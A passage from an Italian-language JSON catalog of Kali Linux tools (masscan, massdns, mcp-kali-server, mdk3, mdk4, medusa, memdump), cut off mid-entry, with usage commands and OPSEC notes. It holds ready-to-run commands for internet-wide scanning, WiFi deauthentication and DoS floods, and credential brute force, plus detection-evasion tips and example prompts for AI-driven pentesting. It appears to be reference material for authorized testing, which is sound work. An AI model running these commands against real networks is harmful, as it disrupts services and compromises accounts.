di service identification senza la necessita di tool aggiuntivi per i servizi piu comuni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Masscan richiede privilegi di root per l'accesso ai raw socket. E fondamentale configurare il rate appropriato per la propria connessione di rete per evitare di saturarla o causare problemi all'infrastruttura intermedia.</p><pre><code># Scansione veloce di una subnet per porte web comuni\nsudo masscan 192.168.0.0/16 -p80,443,8080,8443 --rate 10000\n\n# Scansione completa di tutte le porte su un range\nsudo masscan 10.0.0.0/8 -p1-65535 --rate 100000\n\n# Output in formato Nmap XML per import in altri tool\nsudo masscan 192.168.1.0/24 -p1-1000 -oX scan_results.xml\n\n# Scansione internet con esclusione di range riservati\nsudo masscan 0.0.0.0/0 -p443 --rate 1000000 \\\n  --exclude 10.0.0.0/8 --exclude 172.16.0.0/12 --exclude 192.168.0.0/16\n\n# Banner grabbing su porte specifiche\nsudo masscan 10.0.0.0/24 -p80,443 --banners --rate 1000\n\n# Ripresa di scansione interrotta\nsudo masscan --resume paused.conf</code></pre><p>Per scansioni su internet, e essenziale avere autorizzazione legale e utilizzare il flag --exclude per evitare range militari, governativi e critici. Il rate deve essere calibrato sulla capacita della propria connessione: un rate troppo alto puo saturare router, switch e firewall intermedi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per la <strong>Ricognizione su Larga Scala</strong>, Masscan e lo strumento di riferimento quando il scope include range di rete molto ampi (classi B, C o interi blocchi AS) dove Nmap richiederebbe tempi proibitivi. La fase iniziale di discovery con Masscan identifica rapidamente tutti gli host con porte aperte, producendo una lista ridotta di target che viene poi approfondita con scansioni Nmap dettagliate per service detection, version fingerprinting e script scanning.</p><p>Nel <strong>Bug Bounty con scope ampio</strong>, quando il programma include interi range di IP o ASN dell'organizzazione, Masscan permette di mappare rapidamente tutti i servizi esposti, identificando non solo i servizi web standard ma anche porte non comuni che potrebbero ospitare applicazioni vulnerabili, pannelli di amministrazione o servizi di sviluppo dimenticati.</p><p>Per l'<strong>Asset Discovery e Attack Surface Mapping</strong> in ambito enterprise, Masscan fornisce una visione completa e aggiornata di tutti i servizi esposti nell'infrastruttura, evidenziando porte aperte non autorizzate, servizi shadow IT e sistemi non inventariati che rappresentano potenziali punti di ingresso per gli attaccanti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Masscan e estremamente rumoroso per natura. L'invio di milioni di pacchetti SYN in rapida successione e uno dei pattern di scansione piu facilmente rilevabili da IDS/IPS, firewall e sistemi di monitoring di rete. Qualsiasi sistema di sicurezza anche minimamente configurato rilerera e loggera l'attivita. La randomizzazione degli indirizzi di destinazione, seppur utile per distribuire il carico, non riduce significativamente la rilevabilita poiche il volume complessivo di pacchetti dall'IP sorgente rimane anomalo.</p><p><strong>Impatto operativo:</strong> Rate di scansione elevati possono saturare la connessione di rete dell'operatore, causare problemi ai router e switch intermedi, e potenzialmente attivare meccanismi di protezione DDoS del provider internet. Su target con IPS attivi, l'IP sorgente sara quasi certamente bloccato. La scansione genera un volume di pacchetti che puo interferire con altri servizi sulla stessa rete. Lo stack TCP/IP custom puo confliggere con il kernel del sistema operativo che potrebbe inviare RST per le connessioni non tracciate.</p><p><strong>Mitigazioni:</strong> Calibrare il rate in base alla connessione e al contesto operativo, partendo da valori bassi e aumentando gradualmente. Utilizzare il flag --exclude per escludere range critici e ridurre l'impronta della scansione. Per operazioni Red Team, considerare la distribuzione della scansione su piu sorgenti IP o attraverso servizi cloud. Utilizzare i risultati di Masscan come input per scansioni Nmap mirate e meno rumorose per la fase di approfondimento.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "massdns",
    "name": "massdns",
    "version": "1.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/massdns/",
    "desc": "DNS resolver ad alte prestazioni per risolvere milioni di domini in parallelo.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MassDNS</strong> e un resolver DNS ad altissime prestazioni progettato per risolvere milioni di nomi di dominio in parallelo utilizzando stub resolver multipli. Sviluppato in C per massimizzare la velocita, e in grado di eseguire oltre 350.000 risoluzioni al secondo su hardware commodity, rendendolo uno degli strumenti piu veloci nel suo ambito. Lo strumento e particolarmente utile nella fase di subdomain enumeration, dove e necessario verificare rapidamente se centinaia di migliaia o milioni di potenziali subdomain generati tramite wordlist o permutazioni esistono effettivamente. MassDNS si integra perfettamente in pipeline di ricognizione automatizzate, accettando input da strumenti come Sublist3r, Amass o Subfinder e producendo output strutturato in vari formati. La sua architettura asincrona basata su epoll gestisce decine di migliaia di socket contemporaneamente, distribuendo le query su una lista di resolver pubblici per evitare il rate limiting di singoli server DNS.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Risoluzione massiva parallela:</strong> MassDNS utilizza un approccio completamente asincrono per inviare query DNS a migliaia di resolver contemporaneamente. Il sistema gestisce automaticamente i retry per le query che falliscono o scadono, garantendo risultati completi anche con resolver inaffidabili. La distribuzione del carico su resolver multipli previene il throttling e migliora la velocita complessiva.</p><p><strong>Formati di output multipli:</strong> Lo strumento supporta diversi formati di output tra cui il formato semplice (dominio e IP), il formato completo con tutti i record DNS, e il formato JSON per integrazione programmatica. E possibile filtrare per tipo di record (A, AAAA, CNAME, MX, NS, TXT) e combinare piu tipi in una singola sessione di scansione. L'output e facilmente parsabile da script e altri strumenti nella pipeline.</p><p><strong>Gestione intelligente dei resolver:</strong> MassDNS accetta una lista di server DNS da utilizzare come resolver e distribuisce le query in modo bilanciato. Include meccanismi di retry con backoff esponenziale per gestire timeout e risposte SERVFAIL. E possibile specificare il numero massimo di socket simultanei, il timeout per query, e il numero di retry per ottenere il bilanciamento ottimale tra velocita e affidabilita.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>MassDNS viene tipicamente utilizzato dopo la fase di generazione di potenziali subdomain, per verificare quali di essi esistono effettivamente. Richiede una lista di resolver DNS affidabili e una lista di domini da risolvere.</p><pre><code># Risoluzione base di una lista di subdomain con output semplice\nmassdns -r /usr/share/massdns/lists/resolvers.txt -t A domains.txt -o S > results.txt\n\n# Output in formato JSON per elaborazione programmatica\nmassdns -r resolvers.txt -t A domains.txt -o J -w results.json\n\n# Pipeline completa: generazione subdomain + risoluzione\nsubfinder -d target.com -silent | massdns -r resolvers.txt -t A -o S -w resolved.txt\n\n# Risoluzione con parametri ottimizzati per velocita\nmassdns -r resolvers.txt -t A -s 10000 -o S domains.txt\n\n# Query per record CNAME (utile per subdomain takeover)\nmassdns -r resolvers.txt -t CNAME domains.txt -o S | grep CNAME</code></pre><p>La lista di resolver fornita con il pacchetto si trova in /usr/share/massdns/lists/resolvers.txt. Per risultati ottimali si consiglia di verificare e aggiornare periodicamente i resolver, rimuovendo quelli non piu affidabili. Il parametro -s controlla il numero di socket simultanei e influenza direttamente la velocita.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>subdomain enumeration su larga scala</strong>, MassDNS e lo strumento ideale per validare output di generatori di subdomain come Subfinder o script di permutazione. Quando si lavora con milioni di candidati, la velocita di MassDNS riduce i tempi da ore a minuti. Nel contesto di <strong>bug bounty con scope ampio</strong>, dove programmi consentono l'analisi di interi domini wildcard, MassDNS permette di scoprire rapidamente tutti i subdomain attivi per poi passarli a strumenti come httpx per identificare servizi web. Per operazioni di <strong>asset discovery aziendale</strong>, i team di sicurezza possono mappare completamente la superficie di attacco DNS di un'organizzazione, identificando subdomain dimenticati, servizi esposti e potenziali vulnerabilita di subdomain takeover tramite record CNAME pendenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> MassDNS genera un volume estremamente elevato di query DNS verso resolver pubblici. Questo pattern di traffico e facilmente identificabile dai provider DNS e puo risultare in rate limiting o blacklisting dell'indirizzo IP sorgente. I resolver pubblici come Google DNS e Cloudflare implementano meccanismi di throttling che possono degradare le prestazioni. Le query stesse non raggiungono direttamente il target ma passano attraverso la gerarchia DNS, rendendo il tracciamento meno diretto ma non impossibile.</p><p><strong>Impatto operativo:</strong> L'invio massivo di query DNS puo sovraccaricare resolver DNS poco dimensionati e potenzialmente causare problemi di servizio. In ambienti monitorati, il volume anomalo di risoluzioni DNS puo attivare alert nei sistemi SIEM. I server DNS autoritativi del target riceveranno comunque le query per i subdomain esistenti, fornendo un indicatore di ricognizione in corso.</p><p><strong>Mitigazioni:</strong> Utilizzare una lista diversificata di resolver affidabili per distribuire il carico ed evitare il ban da singoli provider. Regolare il rate di query tramite il parametro -s per ridurre il volume istantaneo. Considerare l'uso di resolver DNS privati o VPN per mascherare l'origine delle query. Eseguire le scansioni in orari di traffico elevato per mimetizzarsi nel rumore di fondo della rete.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "mcp-kali-server",
    "name": "mcp-kali-server",
    "version": "0.0~git20250407.df99f04",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mcp-kali-server/",
    "desc": "Server MCP per integrare tool Kali con LLM AI per automazione pentest assistita.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MCP Kali Server</strong> implementa il Model Context Protocol (MCP) per creare un ponte tra gli strumenti di sicurezza di Kali Linux e i Large Language Models come Claude, GPT e altri assistenti AI. Questo server permette ai modelli linguistici di invocare direttamente tool di penetration testing, analizzarne l'output in tempo reale e guidare sessioni di security assessment in modo conversazionale e assistito. L'integrazione trasforma l'interazione con gli strumenti di sicurezza da un processo manuale basato su riga di comando a un dialogo intelligente dove l'AI comprende il contesto dell'engagement e suggerisce i passi successivi. MCP Kali Server supporta un catalogo crescente di strumenti integrati e fornisce un layer di astrazione che gestisce l'esecuzione sicura dei comandi, il parsing dell'output e la presentazione dei risultati in formato comprensibile dall'AI.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Integrazione MCP Protocol:</strong> Il server implementa lo standard Model Context Protocol, permettendo a qualsiasi client MCP compatibile di connettersi e utilizzare gli strumenti disponibili. Il protocollo definisce un'interfaccia standardizzata per la descrizione delle capacita del server, l'invocazione di strumenti e la restituzione dei risultati. Questa standardizzazione garantisce compatibilita con un ecosistema crescente di client AI e permette aggiornamenti indipendenti di server e client.</p><p><strong>Esecuzione controllata di tool:</strong> MCP Kali Server gestisce l'esecuzione dei tool di sicurezza con un layer di controllo che include validazione dei parametri, timeout configurabili e sandboxing dei processi. Ogni invocazione viene loggata con parametri e risultati per mantenere una traccia completa dell'engagement. Il sistema previene l'esecuzione di comandi potenzialmente distruttivi senza conferma esplicita, aggiungendo un livello di sicurezza all'automazione.</p><p><strong>Analisi contestuale dell'output:</strong> I risultati dei tool vengono strutturati e arricchiti con metadati prima di essere restituiti all'AI, che puo cosi comprendere il significato dei dati nel contesto dell'assessment in corso. Ad esempio, i risultati di un port scan vengono correlati con vulnerabilita note, e l'output di un credential dump viene analizzato per identificare account privilegiati. Questa comprensione contestuale permette all'AI di suggerire autonomamente i passi successivi piu appropriati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>MCP Kali Server si avvia come servizio locale e si configura come provider MCP nel client AI di scelta. Una volta connesso, l'AI puo richiedere l'esecuzione di strumenti attraverso il dialogo naturale.</p><pre><code># Avvia il server MCP\nmcp-kali-server --port 8080\n\n# Configurazione nel client AI (esempio per Claude Desktop)\n# Aggiungere in claude_desktop_config.json:\n# { \"mcpServers\": { \"kali\": { \"command\": \"mcp-kali-server\" } } }\n\n# Esempio di interazioni possibili via AI:\n# \"Esegui un port scan su 192.168.1.0/24\"\n# \"Cerca vulnerabilita sui servizi trovati\"\n# \"Enumera le share SMB sul target 10.0.0.5\"\n# \"Esegui un brute force SSH con la wordlist rockyou\"</code></pre><p>Il server gestisce autonomamente la traduzione delle richieste in comandi specifici, l'esecuzione e il parsing dell'output. I risultati vengono restituiti all'AI in formato strutturato per permettere analisi e raccomandazioni intelligenti. E importante verificare sempre le azioni proposte dall'AI prima di autorizzarne l'esecuzione, specialmente per operazioni invasive.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per il <strong>penetration testing assistito da AI</strong>, MCP Kali Server permette a operatori meno esperti di condurre assessment guidati dall'intelligenza artificiale, che suggerisce metodologie, interpreta risultati e propone il passo successivo della kill chain. L'AI funge da mentore in tempo reale, spiegando il significato di ogni finding. Nell'ambito della <strong>formazione e apprendimento</strong>, studenti di cybersecurity possono interagire con gli strumenti in modo conversazionale, chiedendo spiegazioni su parametri, output e tecniche, accelerando significativamente la curva di apprendimento. Per l'<strong>automazione di workflow ripetitivi</strong>, l'AI puo orchestrare sequenze complesse di strumenti come reconnaissance, vulnerability scanning e reporting, riducendo il tempo necessario per task standardizzati e permettendo all'operatore di concentrarsi sull'analisi dei risultati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'impatto OPSEC dipende interamente dai tool sottostanti invocati dal server. Un port scan eseguito via MCP e identico a uno eseguito manualmente dal punto di vista della rete. Tuttavia, l'automazione AI tende a generare pattern piu prevedibili e regolari rispetto all'operatore umano, potenzialmente piu facili da identificare per sistemi di anomaly detection.</p><p><strong>Impatto operativo:</strong> L'AI potrebbe suggerire o eseguire azioni invasive se non adeguatamente configurata con guardrail. L'output dei tool puo contenere dati sensibili (credenziali, PII) che vengono processati dal modello AI, con potenziali implicazioni di data handling. La latenza aggiuntiva del layer AI rende le operazioni piu lente rispetto all'esecuzione diretta dei comandi.</p><p><strong>Mitigazioni:</strong> Configurare sempre la modalita di conferma esplicita per azioni invasive. Limitare i tool disponibili al sottoinsieme necessario per l'engagement corrente. Verificare che i dati sensibili non vengano trasmessi a API cloud se si utilizzano modelli remoti. Preferire modelli locali per engagement con requisiti di confidenzialita stringenti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "AI_MCP"
    ],
    "notes": null
  },
  {
    "id": "mdk3",
    "name": "mdk3",
    "version": "6.0",
    "icon": "../app/icons/mdk3-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mdk3/",
    "desc": "Exploit WiFi per beacon flooding, authentication DoS e SSID bruteforce.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MDK3</strong> è un tool storico per exploitation e stress testing di reti wireless 802.11. Implementa una suite completa di attacchi contro infrastrutture WiFi: beacon flooding per creare centinaia di access point fake, authentication DoS per esaurire le risorse degli AP, deauthentication per disconnettere forzatamente i client, probing attack per scoprire SSID nascosti, e attacchi EAPOL per ambienti enterprise. Scritto in C per massime performance, MDK3 è stato per anni il tool di riferimento per security assessment wireless. Il successore MDK4 aggiunge supporto per 802.11w ma MDK3 rimane preferito per compatibilità con hardware e driver legacy.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Beacon Flood Mode (b):</strong> Genera migliaia di beacon frame con SSID fake, creando centinaia di access point fantasma visibili ai client. Può saturare la lista WiFi dei dispositivi circostanti e testare come AP e client gestiscono ambienti ad alta densità.</p><p><strong>Authentication DoS Mode (a):</strong> Invia flood di authentication request all'access point target. Gli AP hanno risorse limitate per gestire autenticazioni simultanee; questo attacco può causare denial of service bloccando connessioni legittime.</p><p><strong>Deauthentication Mode (d):</strong> Invia frame di deauthentication spoofando l'indirizzo MAC dell'AP, forzando la disconnessione dei client. Prerequisito per attacchi evil twin e cattura handshake WPA.</p><p><strong>SSID Probing Mode (p):</strong> Scopre SSID nascosti (non broadcast) inviando probe request con wordlist di nomi comuni. Quando un AP con SSID nascosto riceve probe per il suo SSID, risponde rivelando la sua presenza.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>MDK3 richiede interfaccia wireless in monitor mode. Ogni attack mode è identificato da una lettera.</p><pre><code># Prerequisito: monitor mode\nairmon-ng start wlan0\n\n# BEACON FLOODING - crea fake AP con SSID da file\nmdk3 wlan0mon b -f ssid_list.txt -c 6\n# -c specifica il canale, -f file con lista SSID\n\n# BEACON FLOODING - genera SSID random\nmdk3 wlan0mon b -c 6 -s 256\n# -s lunghezza SSID random\n\n# AUTHENTICATION DOS\nmdk3 wlan0mon a -a 00:11:22:33:44:55\n# -a MAC address dell'AP target\n\n# AUTHENTICATION DOS - tutti gli AP visibili\nmdk3 wlan0mon a\n\n# DEAUTHENTICATION - client specifico\nmdk3 wlan0mon d -b blacklist.txt -c 6\n# blacklist.txt contiene MAC dei client da disconnettere\n\n# DEAUTHENTICATION - tutti i client su un canale\nmdk3 wlan0mon d -c 6\n\n# SSID PROBING - scopri hidden SSID\nmdk3 wlan0mon p -f ssid_wordlist.txt -c 6\n\n# MICHAEL SHUTDOWN - attacco specifico TKIP\nmdk3 wlan0mon m -t 00:11:22:33:44:55\n# Causa MIC failure e temporaneo shutdown AP TKIP</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Wireless Penetration Testing</strong>, MDK3 è usato per testare la resilienza dell'infrastruttura WiFi. Gli attacchi DoS verificano se gli AP mantengono disponibilità sotto stress e se sistemi di backup intervengono correttamente.</p><p>Per <strong>WIDS/WIPS Testing</strong>, gli attacchi MDK3 sono specificamente progettati per triggerare alert in sistemi di detection wireless. Verifica che il WIDS rilevi beacon flooding, deauth attack, e altri comportamenti malevoli.</p><p>Nel <strong>Red Team Physical Assessment</strong>, il deauthentication attack forza client a riconnettersi, prerequisito per attacchi evil twin dove un fake AP cattura credenziali di ignari utenti che si riconnettono all'AP malevolo.</p><p>Per <strong>Hidden SSID Discovery</strong>, il probing mode è il metodo più efficace per identificare reti wireless con SSID nascosto, security through obscurity facilmente bypassabile.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità Critica:</strong> Attacchi DoS contro reti wireless sono reati penali in quasi tutte le giurisdizioni. L'uso non autorizzato può comportare conseguenze legali severe. Utilizzare ESCLUSIVAMENTE in laboratori isolati o con autorizzazione scritta esplicita dal proprietario della rete.</p><p><strong>Impatto Collaterale:</strong> Gli attacchi wireless influenzano inevitabilmente reti circostanti. Beacon flooding e deauth su canali comuni disturbano tutte le reti nelle vicinanze, non solo il target. In ambienti reali, impossibile limitare l'impatto al solo target.</p><p><strong>Detection Immediata:</strong> Sistemi WIDS enterprise (Cisco, Aruba, Mist) rilevano immediatamente questi attacchi con alert ad alta priorità. L'attività viene loggata e l'interfaccia attaccante può essere localizzata fisicamente tramite triangolazione.</p><p><strong>Obsolescenza Parziale:</strong> Con 802.11w (Protected Management Frames) e WPA3, deauthentication attack sono mitigati. Per reti moderne, considerare MDK4 che implementa tecniche di bypass PMF.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "mdk4",
    "name": "mdk4",
    "version": "4.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mdk4/",
    "desc": "Evoluzione di mdk3 con attacchi WiFi moderni: PMKID, 802.11w bypass, WPA3 DoS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MDK4</strong> è l'evoluzione del celebre MDK3, aggiornato per supportare attacchi contro le protezioni WiFi moderne. La principale innovazione è il supporto per il bypass di 802.11w (Protected Management Frames/PMF), la tecnologia progettata per proteggere contro attacchi di deauthentication. Include inoltre attacchi specifici per WPA3, cattura PMKID senza necessità di client connessi, e tutti gli attacchi legacy di MDK3 con performance migliorate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>802.11w PMF Bypass:</strong> La feature più significativa. Protected Management Frames dovrebbe impedire deauth attacks, ma MDK4 implementa tecniche per bypassare o degradare questa protezione in determinate configurazioni, rendendo ancora possibili attacchi DoS su reti \"protette\".</p><p><strong>WPA3 Attack Vectors:</strong> Include attacchi specifici contro WPA3: denial of service durante SAE handshake, attacchi di downgrade per forzare fallback a WPA2, e fuzzing del protocollo per identificare vulnerabilità implementative.</p><p><strong>PMKID Capture:</strong> Può catturare PMKID (Pairwise Master Key Identifier) direttamente dall'Access Point senza necessità che client siano connessi, accelerando il processo di cracking WPA2/WPA3-PSK.</p><p><strong>Enhanced Classic Attacks:</strong> Tutti gli attacchi MDK3 (beacon flooding, authentication DoS, deauthentication, EAPOL logoff) sono stati ottimizzati per maggiore efficacia e velocità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>MDK4 richiede un'interfaccia wireless in monitor mode e privilegi root.</p><pre><code># Metti interfaccia in monitor mode\nairmon-ng start wlan0\n\n# Beacon Flooding - crea centinaia di fake AP\nmdk4 wlan0mon b -f ssids.txt -c 6\n\n# Deauthentication con bypass 802.11w\nmdk4 wlan0mon d -B -c 6\n\n# Deauth su AP specifico\nmdk4 wlan0mon d -B -c 6 -b target_ap.txt\n\n# Authentication DoS (flood di auth requests)\nmdk4 wlan0mon a -a 00:11:22:33:44:55 -m\n\n# EAPOL Start flooding\nmdk4 wlan0mon e -t 00:11:22:33:44:55\n\n# PMKID capture (combinato con deauth per forzare reconnection)\nmdk4 wlan0mon d -B -c 6 -a AP_MAC\n# Poi usare hcxdumptool per catturare PMKID</code></pre><p>La modalità -B è il flag chiave per attivare il bypass di 802.11w dove possibile.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Security Assessment</strong>, MDK4 è essenziale per testare la resilienza delle reti wireless enterprise contro attacchi DoS, verificando che 802.11w e WPA3 siano correttamente implementati.</p><p>Durante <strong>Red Team Engagement</strong>, può essere usato per forzare la disconnessione di client specifici, facilitando attacchi di evil twin o credential capture.</p><p>Per <strong>Security Research</strong>, il fuzzing di protocolli WPA3 e la verifica di implementazioni PMF rivelano vulnerabilità in firmware e driver di AP e client.</p><p>Nel <strong>Penetration Testing</strong> wireless, il beacon flooding e auth DoS testano la stabilità dell'infrastruttura e l'efficacia di WIPS/WIDS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità:</strong> Gli attacchi DoS contro reti wireless sono illegali nella maggior parte delle giurisdizioni. L'uso non autorizzato può costituire reato penale. Utilizzare ESCLUSIVAMENTE in ambienti di laboratorio isolati o con autorizzazione scritta esplicita.</p><p><strong>Impatto:</strong> Può causare denial of service a reti critiche (ospedali, sistemi industriali) con conseguenze potenzialmente gravi. Il beacon flooding può saturare lo spettro radio influenzando reti adiacenti.</p><p><strong>Rilevamento:</strong> Sistemi WIPS enterprise (Cisco, Aruba) rilevano e segnalano questi attacchi. L'attività è registrata e l'interfaccia attaccante può essere geolocalizzata.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "medusa",
    "name": "medusa",
    "version": "2.3",
    "icon": "../app/icons/medusa-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/medusa/",
    "desc": "Brute forcer parallelo e modulare per autenticazione su servizi di rete multipli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Medusa</strong> e un brute forcer di rete parallelo, modulare e ad alte prestazioni progettato per testare la robustezza delle credenziali di autenticazione su una vasta gamma di servizi di rete. Supporta oltre 20 protocolli tra cui SSH, FTP, HTTP, SMB, RDP, MySQL, PostgreSQL, VNC, Telnet, SMTP e molti altri. La sua architettura modulare permette di aggiungere facilmente supporto per nuovi protocolli senza modificare il core dell'applicazione. Medusa si distingue per la gestione efficiente dei thread paralleli, permettendo di testare simultaneamente combinazioni multiple di credenziali su host multipli. Lo strumento supporta file di combinazione (combo files) nel formato host:user:password, permettendo attacchi mirati dove diverse credenziali vengono testate su diversi servizi in un'unica sessione.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Architettura modulare per protocolli:</strong> Ogni protocollo supportato e implementato come modulo indipendente che gestisce la logica specifica di autenticazione. Questo approccio permette aggiornamenti granulari e l'aggiunta di nuovi protocolli senza impattare la stabilita dei moduli esistenti. I moduli includono SSH, FTP, HTTP (basic/digest/form), SMB, RDP, VNC, MySQL, PostgreSQL, MSSQL, Oracle, SMTP, POP3, IMAP, Telnet, rlogin, rsh e altri.</p><p><strong>Parallelismo configurabile e ripresa sessioni:</strong> Medusa consente di specificare il numero di thread per host, il numero di host da attaccare simultaneamente e i timeout per ogni connessione. Il sistema di ripresa delle sessioni interrotte permette di continuare un attacco dal punto esatto in cui si era fermato, risparmiando tempo prezioso in campagne di test prolungate. Queste funzionalita rendono Medusa particolarmente efficace in ambienti con molti target.</p><p><strong>Combo files e input flessibile:</strong> Oltre alle tradizionali liste separate di username e password, Medusa supporta combo files che specificano combinazioni host:user:password su ogni riga. Questo formato e ideale quando si dispone di credenziali specifiche per target specifici, come nel caso di credenziali ottenute da dump o da precedenti fasi di ricognizione. Lo strumento accetta anche input da stdin per integrazione in pipeline automatizzate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Medusa si utilizza da riga di comando specificando il target, le credenziali da testare e il modulo del protocollo. La sintassi e intuitiva e permette configurazioni da semplici a molto elaborate.</p><pre><code># Brute force SSH con singolo utente e lista password\nmedusa -h 192.168.1.10 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh\n\n# Test con lista utenti e password su FTP\nmedusa -h 192.168.1.10 -U users.txt -P passwords.txt -M ftp\n\n# Attacco parallelo su host multipli via SMB\nmedusa -H hosts.txt -U users.txt -P pass.txt -M smbnt -T 5 -t 3\n\n# Combo file per attacco mirato\nmedusa -C combo.txt -M ssh\n\n# HTTP form brute force con parametri custom\nmedusa -h target.com -u admin -P pass.txt -M http -m DIR:/login -m FORM:user=&pass=\n\n# Ripresa di una sessione interrotta\nmedusa -h target.com -u admin -P pass.txt -M ssh -Z h1u1</code></pre><p>Il parametro -T controlla il numero di host da attaccare in parallelo, mentre -t specifica il numero di tentativi simultanei per host. Il parametro -Z permette di riprendere una sessione specificando il punto di interruzione. E consigliabile iniziare con pochi thread per valutare la reattivita del target prima di aumentare il parallelismo.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante un <strong>password audit aziendale</strong>, Medusa viene utilizzato per verificare la conformita delle password alle policy di sicurezza, testando servizi interni come SSH, RDP e database contro liste di password comuni e specifiche per l'organizzazione. Questo aiuta a identificare credenziali deboli prima che possano essere sfruttate da attaccanti reali. In una campagna di <strong>penetration testing</strong>, dopo aver identificato servizi di autenticazione durante la fase di reconnaissance, Medusa permette di testare credenziali default, password comuni e combinazioni derivate da OSINT per ottenere accesso iniziale ai sistemi target. Per la <strong>verifica post-compromissione di credenziali</strong>, quando si ottengono hash o password in chiaro durante un engagement, Medusa puo essere usato per verificare il riutilizzo delle credenziali su altri servizi dell'infrastruttura target, mappando la portata del credential reuse.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Gli attacchi brute force generano un volume elevato di tentativi di autenticazione falliti che vengono registrati nei log di sistema e sono facilmente identificabili da qualsiasi soluzione SIEM o IDS. Pattern come centinaia di login failure dallo stesso IP in pochi minuti attivano immediatamente alert di sicurezza. Molti servizi implementano rate limiting e ban temporaneo dopo un numero configurabile di tentativi falliti.</p><p><strong>Impatto operativo:</strong> Il brute forcing aggressivo puo causare account lockout se le policy di sicurezza lo prevedono, potenzialmente causando denial of service per utenti legittimi. Su servizi con risorse limitate, il volume di connessioni puo degradare le prestazioni. In ambienti Active Directory, i lockout possono propagarsi a tutti i domain controller.</p><p><strong>Mitigazioni:</strong> Limitare il numero di thread con i parametri -T e -t per ridurre il volume istantaneo di tentativi. Utilizzare il parametro -W per aggiungere delay tra i tentativi. Preferire wordlist mirate e corte piuttosto che liste massive per ridurre il rumore. Verificare le policy di lockout del target prima di iniziare e configurare Medusa di conseguenza. Considerare l'uso di credential stuffing mirato piuttosto che brute force puro quando possibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "memdump",
    "name": "memdump",
    "version": "1.01",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/memdump/",
    "desc": "Dump della memoria fisica di un sistema Linux per analisi forense e ricerca chiavi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Memdump</strong> è un tool di acquisizione forense per creare dump della memoria fisica (RAM) di sistemi Linux. Legge direttamente da /dev/mem o /dev/fmem per estrarre l'intero contenuto della memoria volatile in formato raw. La memoria RAM contiene informazioni critiche non presenti su disco: chiavi di crittografia in uso (LUKS, VeraCrypt, BitLocker), password in chiaro di sessioni attive, processi e moduli kernel caricati, artefatti di malware fileless, e connessioni di rete attive. L'acquisizione della memoria è un passo fondamentale nell'analisi forense e incident response, poiché queste informazioni vengono perse irreversibilmente allo spegnimento del sistema.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Physical Memory Access:</strong> Accede direttamente alla memoria fisica tramite /dev/mem o /dev/fmem (kernel module). Bypassa le astrazioni del sistema operativo per ottenere una vista raw della RAM inclusi kernel space e hardware-mapped regions.</p><p><strong>Fast Acquisition:</strong> Dump veloce con overhead minimo. La velocità è critica in forensics per catturare uno snapshot consistente prima che i dati cambino. Throughput limitato solo dalla velocità di I/O del media di destinazione.</p><p><strong>Raw Binary Format:</strong> Output in formato binario grezzo 